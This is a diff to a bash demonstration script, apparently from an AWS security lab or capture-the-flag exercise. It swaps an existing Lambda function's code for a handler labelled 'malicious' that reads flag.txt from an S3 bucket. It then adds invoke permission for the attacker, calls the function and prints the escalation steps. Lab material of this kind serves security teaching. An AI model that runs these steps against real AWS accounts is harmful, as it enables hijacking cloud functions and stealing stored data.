@@ -245,23 +245,25 @@ echo "Creating Python code that will read the S3 flag via the Lambda execution r
 cat > /tmp/lambda_function.py << EOF
 import boto3
 import json
+import os
 
 def lambda_handler(event, context):
     """
     Malicious Lambda function that reads the S3 flag object
     and returns its contents in the response.
     The Lambda execution role has s3:GetObject on the target bucket.
-    The target bucket name is passed in the event payload.
+    The target bucket name is baked into the handler at write time
+    (unquoted heredoc), so the invocation payload can be empty.
     """
     s3 = boto3.client('s3')
 
     try:
-        bucket = event.get('bucket', '')
+        bucket = os.environ.get('TARGET_BUCKET', '${TARGET_BUCKET}')
 
         if not bucket:
             return {
                 'statusCode': 500,
-                'body': json.dumps({'error': 'bucket key missing from event payload'})
+                'body': json.dumps({'error': 'TARGET_BUCKET not set'})
             }
 
         obj = s3.get_object(Bucket=bucket, Key='flag.txt')
@@ -360,14 +362,13 @@ use_starting_creds
 export AWS_REGION=$AWS_REGION
 export AWS_DEFAULT_REGION="$AWS_REGION"
 echo "The Lambda will execute as $LAMBDA_EXEC_ROLE which has s3:GetObject on the target bucket..."
-echo "Passing the target bucket name in the event payload so the payload knows where to read the flag from..."
+echo "The bucket name was baked into the handler at write time, so the invocation payload is empty..."
 
-INVOKE_PAYLOAD="{\"bucket\": \"$TARGET_BUCKET\"}"
-show_attack_cmd "Attacker" "aws lambda invoke --region $AWS_REGION --function-name $TARGET_LAMBDA --payload '$INVOKE_PAYLOAD' /tmp/response.json"
+show_attack_cmd "Attacker" "aws lambda invoke --region $AWS_REGION --function-name $TARGET_LAMBDA --payload '{}' /tmp/response.json"
 aws lambda invoke \
     --region $AWS_REGION \
     --function-name $TARGET_LAMBDA \
-    --payload "$INVOKE_PAYLOAD" \
+    --payload '{}' \
     /tmp/response.json \
     --query 'StatusCode' \
     --output text > /dev/null
@@ -427,7 +428,7 @@ echo -e "\n${YELLOW}Attack Summary:${NC}"
 echo "1. Started as: $STARTING_USER (no S3 access, no Lambda invoke permission)"
 echo "2. Used lambda:UpdateFunctionCode to replace $TARGET_LAMBDA with code that reads s3://$TARGET_BUCKET/flag.txt"
 echo "3. Used lambda:AddPermission to grant ourselves invoke permission on the function"
-echo "4. Invoked the modified Lambda with the bucket name in the event payload — it executed as $LAMBDA_EXEC_ROLE which has s3:GetObject"
+echo "4. Invoked the modified Lambda with an empty payload (the bucket was baked into the handler at write time) — it executed as $LAMBDA_EXEC_ROLE which has s3:GetObject"
 echo "5. Extracted flag from Lambda response: $FLAG_VALUE"
 
 echo -e "\n${YELLOW}Attack Path:${NC}"
